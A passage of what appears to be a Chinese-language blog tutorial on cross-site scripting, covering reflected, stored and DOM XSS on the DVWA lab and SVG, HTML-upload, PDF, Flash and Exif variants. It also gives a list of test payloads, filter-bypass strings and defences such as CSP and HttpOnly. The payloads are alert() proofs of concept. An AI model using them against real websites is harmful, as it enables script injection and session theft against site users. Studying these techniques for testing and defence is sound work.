+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>测试流程：看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）</p>
+<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>代码在url中</p>
+<p>文件内容：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;input&quot;</span>&gt;     </span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$XssReflex</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;output:&lt;br&gt;&#x27;</span>.<span class="variable">$XssReflex</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问，当用户输入什么，页面返回什么，没有对用户输入进行过滤</p>
+<p>可以传入html代码，XSS代码-&gt;html代码（可以传入html标签）</p>
+<p>传入<h1>1</h1></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721734047732-9c6710c0-b6f2-474a-9055-d4fa959f8749.png"></p>
+<p>我们插入的XSS代码，可以让他出一个弹窗，可以执行JavaScript代码</p>
+<script>alert(1)</script>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721734253461-f06b8340-d1d5-4355-b64a-347fa14c4609.png"></p>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onerror=alert(1)>
+
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src=1 onclick=alert(1)>
+
+<p>dvwa靶场演示：</p>
+<p>我们在两个浏览器分别登录dvwa的两个不同用户</p>
+<p>攻击者构造payload，将url发送给受害者</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721735136660-7755237b-8405-4e90-8604-e3dec7900ede.png"></p>
+<p>受害者点击url后JavaScript代码执行</p>
+<blockquote>
+<p>触发前提：受害者登录网站，点击恶意链接</p>
+</blockquote>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>dvwa靶场演示：</p>
+<p>攻击者在留言板中插入xss代码，存储到数据库中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721735661557-b3c08d34-969a-4b5d-b1cb-fc0adf0c6b84.png"></p>
+<p>受害者每次访问都会出现弹窗</p>
+<p>只有从数据库把插入的xss代码删除才会停止</p>
+<h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>DOM（Document Object Model）文档对象模型，是HTML和XML文档的编程接口</p>
+<p>HTML DOM定义了所有HTML元素的对象和属性，以及访问它们的方法</p>
+<blockquote>
+<p>HTML DOM是关于如何获取、修改、添加或删除HTML元素的标准</p>
+</blockquote>
+<p>DOM以树结构表达HTML文档</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721736042657-9f35bfb9-201d-442b-93ae-8a77354b6da4.png"></p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>不会与后台进行交互，是完完全全的web前端安全问题</p>
+<p>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，并不与服务端进行交互，而是从客户端获取DOM中的数据（如URL中数据）并在本地执行；其次，浏览器用户可以操作DOM中的一些对象，如URL、location等，当攻击者可以控制一些DOM对象，输入一些恶意JS代码，而客户端的脚本并没有对用户的输入进行有效的过滤，传入一些危险函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在</p>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">浅析DOM型XSS [ Mi1k7ea ]</a></p>
+<p>dvwa靶场演示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738397605-7a1a0851-3a49-4752-9839-65271e69791b.png"></p>
+<p>更改参数为XSS代码</p>
+<p>?default&#x3D;<script>alert(1)</script></p>
+<h1 id="其他类型XSS"><a href="#其他类型XSS" class="headerlink" title="其他类型XSS"></a>其他类型XSS</h1><h2 id="MXSS"><a href="#MXSS" class="headerlink" title="MXSS"></a>MXSS</h2><p>变异型跨站点脚本，是一种由HTML处理方式引起的安全漏洞。即使 Web 应用程序具有强大的过滤器来阻止传统的 XSS攻击，mXSS仍可能潜入其中。这是因为mXSS利用HTML行为中的特殊性，使数据清洗工具无法发现恶意元素。</p>
+<blockquote>
+<p>现在基本没有</p>
+</blockquote>
+<h2 id="UXSS"><a href="#UXSS" class="headerlink" title="UXSS"></a>UXSS</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7031788659221200927">https://juejin.cn/post/7031788659221200927</a></p>
+<blockquote>
+<p>现在也基本见不到</p>
+</blockquote>
+<p>UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。</p>
+<p>CVE-2021-34506</p>
+<blockquote>
+<p>Edge浏览器翻译功能导致JS语句被调用执行（网站提前插入XSS代码，本身无害化，但是经过该浏览器翻译功能一翻译，就会触发这个XSS代码）</p>
+</blockquote>
+<h2 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG-XSS"></a>SVG-XSS</h2><p>SVG类型文件可以理解为和jpg、png类似的后缀图片格式，打开之后还是一个图片</p>
+<blockquote>
+<p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p>
+</blockquote>
+<p>复现：</p>
+<p>svg图片文件内容：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129076889-8b09c1e3-4a49-4ff8-83b1-6d0e037318b6.png"></p>
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;circle cx=&quot;100&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;2&quot; fill=&quot;red&quot; /&gt;</span><br><span class="line">   &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>只需要插入<script>alert(1)</script>即可</p>
+</blockquote>
+<p>将js代码插入svg文件中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129275784-e747e1f8-65cc-4bee-8037-940e3ddd1752.png"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt;</span><br><span class="line">&lt;circle cx=&quot;100&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;2&quot; fill=&quot;red&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传svg文件，xss代码被执行，形成svg-xss</p>
+<p>访问上传后的svg文件地址，被解析执行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130419087-c378c7c0-f2c6-4d21-889c-decf74c6ddb9.png"></p>
+<h2 id="HTML-XSS"><a href="#HTML-XSS" class="headerlink" title="HTML-XSS"></a>HTML-XSS</h2><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryQBqxUDSihkjIckMP</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.html&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.onload = function () &#123;</span><br><span class="line">            alert(&#x27;123&#x27;);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">------WebKitFormBoundaryQBqxUDSihkjIckMP--</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF-XSS"></a>PDF-XSS</h2><p>复现：</p>
+<p>1、创建PDF，加入动作JS</p>
+<p>2、通过文件上传获取直链</p>
+<p>3、直链地址访问后被触发</p>
+<p>创建空白pdf</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129908885-ff14de39-ab21-497f-8cd3-c326767f354b.png"></p>
+<p>向空白pdf中插入js</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733129879324-fc7f1dbc-5ad8-4982-a32b-ba7f52553c01.png"></p>
+<p>app表示打开pdf的当前应用</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130057228-c2ec2765-980f-4182-8502-a0a72f2abd2c.png"></p>
+<p>浏览器打开该pdf，xss代码执行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130138813-a1d3c6d6-ea06-487f-882f-e265f40c15a5.png"></p>
+<p>在有文件上传的点时，上传该pdf，获取上传文件路径，访问即可触发xss</p>
+<p>还可以使用python生成含有xss的pdf</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfReader, PdfWriter</span><br><span class="line"><span class="comment"># 创建一个新的 PDF 文档</span></span><br><span class="line">output_pdf = PdfWriter()</span><br><span class="line"><span class="comment"># 添加一个新页面</span></span><br><span class="line">page = output_pdf.add_blank_page(width=<span class="number">72</span>, height=<span class="number">72</span>)</span><br><span class="line"><span class="comment"># 添加js代码</span></span><br><span class="line">output_pdf.add_js(<span class="string">&quot;app.alert(&#x27;123&#x27;);&quot;</span>)</span><br><span class="line"><span class="comment"># 将新页面写入到新 PDF 文档中</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xss.pdf&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    output_pdf.write(f)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733130639157-c7f5eef9-9952-4fbd-a97d-e03fc3410435.png"></p>
+<h2 id="Flash-XSS（SWF-XSS）"><a href="#Flash-XSS（SWF-XSS）" class="headerlink" title="Flash-XSS（SWF-XSS）"></a>Flash-XSS（SWF-XSS）</h2><p>1、反编译swf文件</p>
+<p>2、查找触发危险函数</p>
+<p>3、找可控参数访问触发</p>
+<p>xss一是指执行恶意js，那么为什么说flash xss呢？是因为flash有可以调用js的函数，也就是可以和js通信，因此这些函数如果使用不当就会造成xss。</p>
+<p>常见的可触发xss的危险函数有：getURL，navigateToURL，ExternalInterface.call(最多)，htmlText，loadMovie等等</p>
+<p>复现：</p>
+<p>新建swf文件</p>
+<p>随便选一个动画模板</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733131882320-ccc0a813-5152-4b14-b111-0abb858a4d7d.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733131952906-6da63f57-729b-473e-8260-41517faa482b.png"></p>
+<p>F9进入代码区域，写入攻击payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//取m参数</span><br><span class="line">var m=_root.m;</span><br><span class="line">//调用html中Javascript中的m参数值</span><br><span class="line">flash.external.ExternalInterface.call(m);</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132057944-58f775bb-216c-41d1-a82b-bdb447894ce4.png"></p>
+<p>ctrl+回车看看能否正常显示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132081301-1b634733-8971-4719-8010-66495aab9393.png"></p>
+<p>设置好后点击发布设置，发布即可</p>
+<p>实战中将我们制作好的swf文件上传，访问swf文件，给m参数传参js代码，使js代码执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?m=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132439839-232b9d70-7c16-46cf-9c62-678886dd7923.png"></p>
+<p>如果没有文件上传点，可以先进行目录扫描，如果存在swf文件，对swf文件下载，使用JPEXS进行逆向分析</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132563701-e3c1fb9c-b7c8-43bd-a050-885333e9f878.png"></p>
+<p>找ExternalInterface.call函数</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132619188-b390c1a4-50c2-4a23-b7ed-6675ea2847c6.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1733132661474-5434d771-c1a1-4fe3-a3de-28ab33133383.png"></p>
+<p>这里就是jsobject这个变量，我们对这个变量传参</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132704104-3f8c6926-034c-49d7-bca7-c40ad88224eb.png"></p>
+<p>如果这里不是获取变量的值，而是写死了，用户不可控，就无法利用</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733132830220-2c0e975b-c19d-4ec0-86c7-1be1906ea279.png"></p>
+<h2 id="Exif-XSS"><a href="#Exif-XSS" class="headerlink" title="Exif-XSS"></a>Exif-XSS</h2><p>可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。</p>
+<p>复现：</p>
+<p>有些网站有读取图片exif信息的功能，当网站读取到的恶意的exif信息就会触发这个payload，上面已经演示过了。</p>
+<p>有些谷歌浏览器安装了EXIF Vewer插件，而chrome Exif Viewer插件获取图片exif信息的时候没有过滤，导致了XSS代码的执行。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/104814749">https://blog.csdn.net/qq_32393893&#x2F;article&#x2F;details&#x2F;104814749</a></p>
+<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h2><ol>
+<li>发送带有XSS恶意脚本的链接</li>
+<li>用户点击了恶意链接，访问了目标服务器</li>
+<li>网站将XSS同正常页面返回到用户浏览器</li>
+<li>用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求</li>
+<li>黑客从自己搭建的恶意服务器中获取用户提交的信息</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738681366-82e2aad7-8021-4a37-8c37-bffe283afa83.png"></p>
+<h2 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h2><ol>
+<li>黑客在目标服务器上构造XSS恶意脚本，保存在数据库中</li>
+<li>用户在网站登录状态下，访问了目标服务器，查看了存在恶意脚本的页面</li>
+<li>网站将XSS同正常页面返回到用户浏览器</li>
+<li>用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求</li>
+<li>黑客从自己搭建的恶意服务器中获取用户提交的信息</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738724510-8056d587-c666-4535-bd9f-bb16f9737740.png"></p>
+<h1 id="常见事件处理程序"><a href="#常见事件处理程序" class="headerlink" title="常见事件处理程序"></a>常见事件处理程序</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1721738813093-3df1262f-b8f3-451d-b730-5996a4938386.png"></p>
+<h1 id="常见测试代码"><a href="#常见测试代码" class="headerlink" title="常见测试代码"></a>常见测试代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=write(&#x27;xss&#x27;) autofocus&gt;  </span><br><span class="line">&lt;img src onerror=alert(&#x27;xss&#x27;)&gt; 			//图片加载错误时触发</span><br><span class="line">&lt;img src onclick=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;svg onload=alert(&#x27;xss&#x27;) &gt;  </span><br><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;  </span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;clickme&lt;/a&gt;  </span><br><span class="line">&lt;/td&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  </span><br><span class="line">&#x27;&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  			//闭合</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  </span><br><span class="line">&lt;/title&gt;&lt;script&gt;alert(123456)&lt;/script&gt;  </span><br><span class="line">&lt;scrip&lt;script&gt;t&gt;alert(123456)&lt;/scrip&lt;/script&gt;t&gt;  </span><br><span class="line">&lt;/div&gt;&lt;script&gt;alert(123456)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>多使用F12查看输入的内容显示在什么地方</p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="开启CSP"><a href="#开启CSP" class="headerlink" title="开启CSP"></a>开启CSP</h2><p>CSP（Content Security Policy）指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略。CSP本质上是建立白名单，规定了浏览器只能够执行特定来源的代码，即使存在跨站脚本攻击漏洞，也不会加载来源不明的第三方脚本。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733219887584-0dbcbd62-a902-422f-b172-10dd26b0025d.png"></p>
+<p>xss的攻击都要加载外部内容，开启CSP之后，无法加载外部资源，只能加载本地源</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733219774275-2e933f58-ca2d-4e49-ba41-1c217cb9674f.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733219782990-99b1cdd3-9bc1-4ccb-8fb5-b75a41cf51de.png"></p>
+<p>可以绕过CSP的情况只有：对方配置不正确，有的php文件中没有开启CSP</p>
+<h2 id="使用HttpOnly"><a href="#使用HttpOnly" class="headerlink" title="使用HttpOnly"></a>使用HttpOnly</h2><p>HttpOnly是加在cookies上的一个标识，用于告诉浏览器不要向客户端脚本(document.cookie或其他)暴需cookie。当你在cookie上设置HttpOnly标识后，浏览器就会知到这是特殊的cookie，只能由服务器检索到，所有来自客户端脚本的访问都会被禁止。</p>
+<blockquote>
+<p>只对Cookie有限制</p>
+</blockquote>
+<p>php里设置HttpOnly</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHP.INI设置或代码引用</span><br><span class="line"></span><br><span class="line">-session.cookie_httponly =<span class="number">1</span></span><br><span class="line">-ini_set(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>);</span><br><span class="line">-setcookie(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, time() + <span class="number">3600</span>, <span class="string">&#x27;/xss&#x27;</span>, <span class="string">&#x27;&#x27;</span>, false, true);</span><br></pre></td></tr></table></figure>
+
+<p>开启HttpOnly的情况</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215677010-dfa8f0e9-1b85-4e4f-82d6-8a850d1d9e0b.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215747362-0238c247-b699-4499-937a-cd7e0f2d8361.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215878714-465ddd3d-432d-4aa5-ac34-aab5e315f6c2.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215885607-c87e0199-b7eb-4e1e-a275-0e745b1c8166.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215896075-3abb1eb9-e67c-4325-98be-38106e42ac8a.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215909684-163e460a-1c2f-46f2-b094-06d9a5c9817a.png"></p>
+<p>如何判断是否启用HttpOnly</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733215585159-0e18585c-618e-4bcd-8c95-37e6bd91ec30.png"></p>
+<p>绕过HttpOnly：</p>
+<p>(1) CVE-2012-0053</p>
+<p>(2) PHPINFO页面&#x2F;</p>
+<p>(3) Flash&#x2F;Java</p>
+<p>太鸡肋，现在网络环境实现不了</p>
+<p>遇到HttpOnly思路：</p>
+<p>不获取Cookie采用方式（钓鱼，浏览器攻击框架等）</p>
